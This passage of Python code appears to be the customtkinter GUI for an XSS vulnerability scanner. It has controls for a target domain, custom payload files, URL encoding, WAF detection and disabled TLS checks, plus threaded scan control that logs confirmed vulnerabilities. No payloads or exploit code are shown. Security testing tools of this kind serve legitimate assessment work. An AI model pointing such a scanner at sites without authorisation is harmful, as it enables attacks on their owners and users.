                                        variable=self.ignore_tls_var,
                                        command=self._tls_warning)
        self.chk_tls.pack(anchor="w", padx=20, pady=3)
        
        self.chk_urlencode = ctk.CTkCheckBox(self.sidebar, text="URL Encode Payloads",
                                        text_color="#aaaacc", fg_color="#ff9900",
                                        hover_color="#cc7a00", checkmark_color="#fff",
                                        variable=self.urlencode_var)
        self.chk_urlencode.pack(anchor="w", padx=20, pady=3)
        self._sep()

        self._file_btn("📂  URL List  (skip recon)", self._pick_url_list)
        self.url_list_lbl = ctk.CTkLabel(self.sidebar, text="No file selected",
                                          font=ctk.CTkFont("Consolas", 10), text_color="#555577")
        self.url_list_lbl.pack(padx=16, pady=(0, 6))

        self._file_btn("🎯  Custom Payloads File", self._pick_payloads)
        payloads_row = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        payloads_row.pack(fill="x", padx=16, pady=(0, 6))
        self.payloads_lbl = ctk.CTkLabel(payloads_row, text="No file selected",
                                          font=ctk.CTkFont("Consolas", 10), text_color="#555577")
        self.payloads_lbl.pack(side="left")
        ctk.CTkButton(payloads_row, text="👁 View", width=42, height=20,
                      font=ctk.CTkFont("Consolas", 10),
                      fg_color="#0a0a12", hover_color="#222233", text_color="#888899",
                      border_width=1, border_color="#333355",
                      command=self.show_payload_preview).pack(side="right")
        self._sep()

        self.start_btn = ctk.CTkButton(
            self.sidebar, text="▶  START SCAN",
            font=ctk.CTkFont("Consolas", 13, "bold"),
            fg_color="#003344", hover_color="#00d9ff", text_color="#00d9ff",
            border_width=1, border_color="#00d9ff", command=self.start_scan)
        self.start_btn.pack(fill="x", padx=16, pady=(6, 4))

        self.stop_btn = ctk.CTkButton(
            self.sidebar, text="⏹  STOP SCAN",
            font=ctk.CTkFont("Consolas", 13, "bold"),
            fg_color="#1a0000", hover_color="#ff0044", text_color="#ff4466",
            border_width=1, border_color="#ff0044", state="disabled",
            command=self.stop_scan)
        self.stop_btn.pack(fill="x", padx=16, pady=(0, 4))

        self.report_btn = ctk.CTkButton(
            self.sidebar, text="📄  Open Report",
            font=ctk.CTkFont("Consolas", 12),
            fg_color="#0a0a12", hover_color="#222233", text_color="#888899",
            border_width=1, border_color="#333355",
            command=self.open_report, state="disabled")
        self.report_btn.pack(fill="x", padx=16, pady=(0, 4))

        self.clear_btn = ctk.CTkButton(
            self.sidebar, text="🗑  Clear Log",
            font=ctk.CTkFont("Consolas", 12),
            fg_color="#0a0a12", hover_color="#222233", text_color="#888899",
            border_width=1, border_color="#333355", command=self.clear_log)
        self.clear_btn.pack(fill="x", padx=16, pady=(0, 16))

        # ── Right panel ───────────────────────────────────────────────────────
        right = ctk.CTkFrame(self, fg_color="#0d0d14", corner_radius=0)
        right.pack(side="right", fill="both", expand=True)

        stats_bar = ctk.CTkScrollableFrame(right, fg_color="#0a0a12", height=60,
                                            corner_radius=0, orientation="horizontal")
        stats_bar.pack(fill="x")

        self.stat_vulns   = self._stat(stats_bar, "VULNS",       "0",    "#ff0055")
        self.stat_urls    = self._stat(stats_bar, "URLS",        "0",    "#00ff88")
        self.stat_reflect = self._stat(stats_bar, "REFLECTIONS", "0",    "#ff9900")
        self.stat_hosts   = self._stat(stats_bar, "HOSTS",       "0",    "#00d9ff")
        self.stat_waf     = self._stat(stats_bar, "WAF",         "NONE", "#cc66ff")
        self.stat_status  = self._stat(stats_bar, "STATUS",      "IDLE", "#888899")

        self.log_box = ctk.CTkTextbox(
            right, font=ctk.CTkFont("Consolas", 12),
            fg_color="#050508", text_color="#00ff88",
            border_width=1, border_color="#111133", corner_radius=0, wrap="none")
        self.log_box.pack(fill="both", expand=True, padx=6, pady=(0, 6))
        for tag, color in [("error","#ff4466"),("warning","#ff9900"),
                            ("success","#00ff88"),("info","#00d9ff"),
                            ("banner","#00d9ff"),("vuln","#ff0055")]:
            self.log_box.tag_config(tag, foreground=color)

    # ── widget helpers ────────────────────────────────────────────────────────

    def _label(self, txt):
        ctk.CTkLabel(self.sidebar, text=txt, font=ctk.CTkFont("Consolas", 11),
                     text_color="#888899", anchor="w").pack(fill="x", padx=16, pady=(6, 0))

    def _sep(self):
        ctk.CTkFrame(self.sidebar, height=1, fg_color="#1a1a2e").pack(fill="x", padx=10, pady=6)

    def _entry(self, placeholder, border="#333355"):
        e = ctk.CTkEntry(self.sidebar, placeholder_text=placeholder,
                         fg_color="#111122", border_color=border, text_color="#e0e0e0")
        e.pack(fill="x", padx=16, pady=(2, 10))
        return e

    def _file_btn(self, label, cmd):
        ctk.CTkButton(self.sidebar, text=label, font=ctk.CTkFont("Consolas", 11),
                      fg_color="#0a0a12", hover_color="#1a1a2e",
                      text_color="#888899", border_width=1, border_color="#333355",
                      command=cmd).pack(fill="x", padx=16, pady=(4, 0))

    def _stat(self, parent, label, value, color):
        f = ctk.CTkFrame(parent, fg_color="#0a0a12", corner_radius=0)
        f.pack(side="left", padx=10, pady=4)
        ctk.CTkLabel(f, text=label, font=ctk.CTkFont("Consolas", 9),
                     text_color="#444466").pack()
        v = ctk.CTkLabel(f, text=value, font=ctk.CTkFont("Consolas", 13, "bold"),
                         text_color=color)
        v.pack()
        return v

    # ── log helpers ───────────────────────────────────────────────────────────

    def _safe_log(self, text: str):
        self.log_box.after(0, self._insert_log, text)

    def _insert_log(self, text: str):
        t = text.strip().lower()
        if any(k in t for k in ["vuln", "critical", "breach", "confirmed", "!!"]):
            tag = "vuln"
        elif any(k in t for k in ["error", "fail", "[-]"]):
            tag = "error"
        elif any(k in t for k in ["warning", "[!]", "missing"]):
            tag = "warning"
        elif any(k in t for k in ["[+]", "found", "complete", "done", "saved"]):
            tag = "success"
        else:
            tag = "info"
        self.log_box.insert("end", text, tag)
        self.log_box.see("end")

    def _log(self, text: str, color: str = "#00ff88"):
        self.log_box.after(0, self._insert_log, text)

    def _log_raw(self, text: str):
        self.log_box.insert("end", text, "banner")

    # ── file pickers ──────────────────────────────────────────────────────────

    def _pick_url_list(self):
        p = filedialog.askopenfilename(title="Select URL List",
                                       filetypes=[("Text files", "*.txt"), ("All", "*.*")])
        if p:
            self.input_list_path = p
            self.url_list_lbl.configure(text=os.path.basename(p), text_color="#00d9ff")

    def _pick_payloads(self):
        p = filedialog.askopenfilename(title="Select Payloads File",
                                       filetypes=[("Text files", "*.txt"), ("All", "*.*")])
        if p:
            self.payloads_file_path = p
            self.payloads_lbl.configure(text=os.path.basename(p), text_color="#00d9ff")

    def _tls_warning(self):
        if self.ignore_tls_var.get():
            messagebox.showwarning("Security Risk",
                "TLS Verification disabled.\nUse ONLY for local proxying or trusted labs.")

    def show_payload_preview(self):
        if not self.payloads_file_path:
            messagebox.showwarning("No File", "No payloads file loaded.")
            return
        try:
            content = Path(self.payloads_file_path).read_text(encoding='utf-8', errors='replace')
            win = ctk.CTkToplevel(self)
            win.title(f"Payloads — {os.path.basename(self.payloads_file_path)}")
            win.geometry("500x400")
            win.configure(fg_color="#0d0d14")
            win.attributes("-topmost", True)
            ctk.CTkLabel(win, text="Loaded Payloads",
                         font=ctk.CTkFont("Consolas", 14, "bold"), text_color="#fff").pack(pady=(10, 5))
            tb = ctk.CTkTextbox(win, font=ctk.CTkFont("Consolas", 11),
                                fg_color="#050508", text_color="#00d9ff",
                                border_width=1, border_color="#111133", wrap="none")
            tb.pack(fill="both", expand=True, padx=10, pady=(0, 10))
            tb.insert("1.0", content)
            tb.configure(state="disabled")
        except Exception as e:
            messagebox.showerror("Read Error", f"Failed to read file:\n{e}")

    # ── stats updater ─────────────────────────────────────────────────────────

    def _update_stats(self):
        if self.engine:
            self.stat_vulns.configure(text=str(len(self.engine.exploits)))
            self.stat_urls.configure(text=str(len(self.engine.urls)))
            self.stat_reflect.configure(text=str(len(self.engine.reflections)))
            self.stat_hosts.configure(text=str(len(self.engine.live_hosts)))
            if self.engine.waf_info and self.engine.waf_info.detected:
                self.stat_waf.configure(text=self.engine.waf_info.waf_type.value[:10])
        if self.is_scanning:
            self.after(1000, self._update_stats)

    # ── scan control ──────────────────────────────────────────────────────────

    def start_scan(self):
        if self.is_scanning:
            return
        domain = self.domain_entry.get().strip()
        if not domain and not self.input_list_path:
            messagebox.showerror("Missing Input", "Enter a target domain or select a URL list.")
            return

        self.stop_event.clear()
        self.is_scanning = True
        self.engine      = None

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.report_btn.configure(state="disabled")
        self.stat_status.configure(text="SCANNING", text_color="#ff9900")
        for w in (self.stat_vulns, self.stat_urls, self.stat_reflect, self.stat_hosts):
            w.configure(text="0")
        self.stat_waf.configure(text="NONE")

        self.log_box.delete("1.0", "end")
        self._log_raw(self._banner_text())
        self._log(f"[+] Starting Neural Scan → {domain or 'URL List'}\n", "#00d9ff")

        self.scan_thread = threading.Thread(target=self._run_scan, daemon=True)
        self.scan_thread.start()
        self._update_stats()

    def stop_scan(self):
        self.stop_event.set()
        self._log("[!] Stop requested — finishing current step...\n", "#ff9900")
        self.is_scanning = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.report_btn.configure(state="normal")
        self.stat_status.configure(text="STOPPED", text_color="#ff4466")

    def _run_scan(self):
        raw    = self.domain_entry.get().strip()
        domain = raw.replace("https://", "").replace("http://", "").strip("/").split("/")[0]
        proxy  = self.proxy_entry.get().strip()

        self.engine = XSSEngine(
            domain           = domain,
            threads          = int(self.threads_slider.get()),
            proxy            = proxy or None,
            payloads_file    = self.payloads_file_path or None,
            urls_file        = self.input_list_path or None,
            export_json      = bool(self.chk_json.get()),
            profile          = self.scan_profile.get(),
            verify_ssl       = not self.ignore_tls_var.get(),
            gui_log          = self._safe_log,
            stop_event       = self.stop_event,
            url_encode       = self.urlencode_var.get(),
            raw_url          = raw
        )

        try:
            self.engine.run_full()
            vcount = len(self.engine.exploits)
            if vcount:
                self._safe_log(f"\n[!!] SCAN COMPLETE — {vcount} VULNERABILITY/IES CONFIRMED!\n")
                for i, v in enumerate(self.engine.exploits, 1):
                    self._safe_log(f"  [{i}] Param: {v['param']} | {v['evidence']}\n")
            else:
                self._safe_log("\n[+] Scan complete — No direct vulnerabilities found.\n")
        except Exception as e:
            self._safe_log(f"\n[-] Fatal error: {e}\n")
        finally:
            self._finish_scan()

    def _finish_scan(self):
        self.is_scanning = False
        self.after(0, self._reset_ui)

    def _reset_ui(self):
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.report_btn.configure(state="normal")
        self.stat_status.configure(text="DONE", text_color="#00ff88")
        if self.engine:
            self.stat_vulns.configure(text=str(len(self.engine.exploits)))
            self.stat_urls.configure(text=str(len(self.engine.urls)))
            self.stat_reflect.configure(text=str(len(self.engine.reflections)))
            self.stat_hosts.configure(text=str(len(self.engine.live_hosts)))

    # ── report ────────────────────────────────────────────────────────────────

    def open_report(self):
        # Try engine report first
        if self.engine and self.engine.report_file.exists():
            os.startfile(str(self.engine.report_file))
            return
        # Search output/ dir for most recent report
        output_dir = Path("output")
        if output_dir.exists():
            reports = list(output_dir.rglob("report.html"))
            if reports:
                os.startfile(str(max(reports, key=lambda p: p.stat().st_mtime)))
                return
        messagebox.showinfo("No Report", "No report found. Run a scan first.")

    def clear_log(self):
        self.log_box.delete("1.0", "end")
        self._log_raw(self._banner_text())


# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    app = YASHXssGUI()
    app.mainloop()
